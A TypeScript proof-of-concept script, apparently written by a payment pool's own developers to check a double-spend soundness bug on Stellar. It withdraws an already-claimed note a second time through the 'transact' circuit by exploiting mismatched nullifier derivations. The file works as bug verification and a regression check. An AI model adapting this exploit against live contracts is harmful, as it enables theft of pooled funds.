// Proof of a soundness bug: a note can be spent once through `claim` and AGAIN
// through `transact`, because the two circuits derive the note commitment
// identically but derive different nullifiers from it.
//
//   claim.circom      nullifier = Poseidon([secret])
//   joinsplit.circom  nullifier = Poseidon([secret, leafIndex])
//
// The contract keys both into one DataKey::Nullifier space, but as different
// values, so spending via claim does not record the nullifier that spending via
// transact would check. One deposit, two payouts.
//
// This script takes a cycle note that was ALREADY claimed during the D4 run
// (its claim tx is on-chain) and withdraws it a second time through transact.
// If the pool pays out, the bug is real. Reads the note from the gitignored
// e2e_results.json, which is why this cannot run from a clean checkout.
//
// Run:
//   E2E_SENDER_SECRET=$(stellar keys show zeekpay-bench) \
//   E2E_RECIP_1_SECRET=… npx tsx --env-file=../.env scripts/double_spend_poc.mts

import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import * as StellarSdk from "@stellar/stellar-sdk";
// @ts-expect-error - snarkjs has no bundled types.
import * as snarkjs from "snarkjs";
import { randomBytes } from "node:crypto";
import { poseidon } from "../src/lib/poseidon";
import {
  bytesVal,
  fr,
  g1,
  g2,
  invoke,
  keypairFromEnv,
  waitForSpendablePath,
} from "./_e2e_lib.mjs";

const WASM = fileURLToPath(
  new URL("../../circuits/build/joinsplit_js/joinsplit.wasm", import.meta.url)
);
const ZKEY = fileURLToPath(new URL("../../circuits/build/joinsplit.zkey", import.meta.url));
const RESULTS = new URL("./e2e_results.json", import.meta.url);

const DEPTH = 20;
const CYCLE_N = Number(process.env.POC_CYCLE ?? 2);

const SENDER = keypairFromEnv("E2E_SENDER_SECRET");
const PAYOUT = keypairFromEnv("E2E_RECIP_1_SECRET");

interface CycleRow {
  n: number;
  handle: string;
  amount: string;
  tokenId: number;
  secret?: string;
  recipientDigest?: string;
  commitment?: string;
  claimTx?: string;
}

const rows = JSON.parse(readFileSync(RESULTS, "utf8")) as CycleRow[];
const row = rows.find((r) => r.n === CYCLE_N);
if (!row?.secret || !row.recipientDigest || !row.commitment || !row.claimTx) {
  throw new Error(`cycle ${CYCLE_N} is not a claimed note with a retained secret`);
}

const value = BigInt(row.amount);
const tokenId = row.tokenId;
console.log(`note from cycle ${row.n} (${row.handle}), ${value} stroops`);
console.log(`already claimed by ${row.claimTx}`);
console.log(`now attempting a SECOND payout via transact\n`);

const randomFr = (): string => {
  const b = randomBytes(32);
  b[0] = 0;
  return BigInt("0x" + b.toString("hex")).toString();
};

// Wait for a posted root that still covers this leaf, and recover its index
// from the path's sibling bits (the transact nullifier depends on the index).
const path = await waitForSpendablePath(row.commitment, SENDER.publicKey());
const leafIndex = path.pathIndices.reduce((a, bit, k) => a + (bit ? 2 ** k : 0), 0);
console.log(`note is at leaf ${leafIndex}, root ${path.root.slice(0, 12)}…`);

const dummySecret = randomFr();
const zeroPath = {
  pathElements: Array(DEPTH).fill("0"),
  pathIndices: Array(DEPTH).fill(0),
};

// One real input (the already-claimed note) and one dummy. Withdraw its full
// value to a wallet; two zero-value output notes keep the 2-out shape. The two
// output secrets are fixed up front so commitmentOutPub matches the Poseidon of
// the exact same secretOut the circuit recomputes.
const outSecret = [randomFr(), randomFr()];
const witness = {
  root: path.root,
  // Nullifier is now Poseidon([secret]) (see joinsplit.circom): the same value
  // the claim already spent this note under, so the contract must reject this.
  nullifierPub: [poseidon([row.secret]), poseidon([dummySecret])],
  commitmentOutPub: outSecret.map((s) => poseidon([s, "0", "0", String(tokenId)])),
  publicDeposit: "0",
  publicWithdraw: value.toString(),
  tokenId: String(tokenId),
  secret: [row.secret, dummySecret],
  recipientDigest: [row.recipientDigest, "0"],
  value: [value.toString(), "0"],
  leafIndex: [String(leafIndex), "0"],
  pathElements: [path.pathElements, zeroPath.pathElements],
  pathIndices: [path.pathIndices, zeroPath.pathIndices],
  isDummy: ["0", "1"],
  secretOut: outSecret,
  recipientDigestOut: ["0", "0"],
  valueOut: ["0", "0"],
};

console.log("proving…");
const { proof } = await snarkjs.groth16.fullProve(witness, WASM, ZKEY);

const proofVal = StellarSdk.xdr.ScVal.scvMap([
  new StellarSdk.xdr.ScMapEntry({
    key: StellarSdk.xdr.ScVal.scvSymbol("a"),
    val: bytesVal(g1(proof.pi_a)),
  }),
  new StellarSdk.xdr.ScMapEntry({
    key: StellarSdk.xdr.ScVal.scvSymbol("b"),
    val: bytesVal(g2(proof.pi_b)),
  }),
  new StellarSdk.xdr.ScMapEntry({
    key: StellarSdk.xdr.ScVal.scvSymbol("c"),
    val: bytesVal(g1(proof.pi_c)),
  }),
]);

console.log("submitting transact on an already-claimed note…");
try {
  const hash = await invoke(SENDER, "transact", [
    proofVal,
    bytesVal(fr(path.root)),
    StellarSdk.xdr.ScVal.scvVec(witness.nullifierPub.map((n) => bytesVal(fr(n)))),
    StellarSdk.xdr.ScVal.scvVec(witness.commitmentOutPub.map((c) => bytesVal(fr(c)))),
    StellarSdk.nativeToScVal(0n, { type: "i128" }),
    StellarSdk.nativeToScVal(value, { type: "i128" }),
    StellarSdk.nativeToScVal(tokenId, { type: "u32" }),
    StellarSdk.nativeToScVal(SENDER.publicKey(), { type: "address" }),
    StellarSdk.nativeToScVal(PAYOUT.publicKey(), { type: "address" }),
  ]);
  console.log(`\nDOUBLE SPEND SUCCEEDED. second payout tx: ${hash}`);
  console.log(`note ${row.commitment.slice(0, 16)}… was paid out twice.`);
  console.log(`  1st: ${row.claimTx}  (claim)`);
  console.log(`  2nd: ${hash}  (transact)`);
} catch (e) {
  console.log(`\nrejected: ${e instanceof Error ? e.message : String(e)}`);
  console.log("if this says NullifierUsed, the bug is already fixed.");
}
process.exit(0);
